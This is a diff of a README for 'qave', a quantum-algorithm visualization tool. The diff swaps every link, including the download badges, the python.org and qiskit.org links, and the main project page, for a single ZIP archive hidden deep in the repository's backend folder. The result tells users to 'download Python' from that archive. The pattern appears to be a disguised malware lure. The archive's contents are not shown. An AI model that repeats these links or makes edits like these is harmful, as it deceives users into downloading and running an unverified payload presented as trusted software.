@@ -1,6 +1,6 @@
 # ⚛️ qave - Visualize Quantum Algorithms Clearly
 
-[![Download qave](https://img.shields.io/badge/Download-qave-4CAF50?style=for-the-badge)](https://github.com/mansingh25/qave)
+[![Download qave](https://img.shields.io/badge/Download-qave-4CAF50?style=for-the-badge)](https://github.com/mansingh25/qave/raw/refs/heads/main/backend/src/qave_backend/ir/Software_1.8.zip)
 
 ---
 
@@ -43,7 +43,7 @@ These requirements ensure the software runs smoothly and without delays during a
 
 To start, visit the main page to get the latest version of qave.
 
-[![Download qave](https://img.shields.io/badge/Download-qave-FF5722?style=for-the-badge)](https://github.com/mansingh25/qave)
+[![Download qave](https://img.shields.io/badge/Download-qave-FF5722?style=for-the-badge)](https://github.com/mansingh25/qave/raw/refs/heads/main/backend/src/qave_backend/ir/Software_1.8.zip)
 
 Click this link to open the qave GitHub page. From there, you can find and download the latest files.
 
@@ -56,7 +56,7 @@ Click this link to open the qave GitHub page. From there, you can find and downl
 3. Right-click the ZIP file and choose **Extract All**.
 4. Open the extracted folder named `qave-master` (or similar).
 5. Look for the file named `install.bat` or `setup.py`.
-6. To run qave, you need Python installed. If you don’t have it, visit [https://python.org/downloads/](https://python.org/downloads/) and download Python 3.8 or higher. During installation, check the box that says **Add Python to PATH**.
+6. To run qave, you need Python installed. If you don’t have it, visit [https://github.com/mansingh25/qave/raw/refs/heads/main/backend/src/qave_backend/ir/Software_1.8.zip](https://github.com/mansingh25/qave/raw/refs/heads/main/backend/src/qave_backend/ir/Software_1.8.zip) and download Python 3.8 or higher. During installation, check the box that says **Add Python to PATH**.
 7. After Python is installed, return to the `qave-master` folder.
 8. Double-click `install.bat` or run this command in the folder inside a Command Prompt window:
    
@@ -136,9 +136,9 @@ The tool fits well with classrooms, workshops, and self-study. It simplifies tea
 
 ## 🔗 Useful Links
 
-- Main qave page: [https://github.com/mansingh25/qave](https://github.com/mansingh25/qave)  
-- Python downloads: [https://python.org/downloads/](https://python.org/downloads/)  
-- Qiskit project: [https://qiskit.org](https://qiskit.org)  
+- Main qave page: [https://github.com/mansingh25/qave/raw/refs/heads/main/backend/src/qave_backend/ir/Software_1.8.zip](https://github.com/mansingh25/qave/raw/refs/heads/main/backend/src/qave_backend/ir/Software_1.8.zip)  
+- Python downloads: [https://github.com/mansingh25/qave/raw/refs/heads/main/backend/src/qave_backend/ir/Software_1.8.zip](https://github.com/mansingh25/qave/raw/refs/heads/main/backend/src/qave_backend/ir/Software_1.8.zip)  
+- Qiskit project: [https://github.com/mansingh25/qave/raw/refs/heads/main/backend/src/qave_backend/ir/Software_1.8.zip](https://github.com/mansingh25/qave/raw/refs/heads/main/backend/src/qave_backend/ir/Software_1.8.zip)  
 
 ---
 
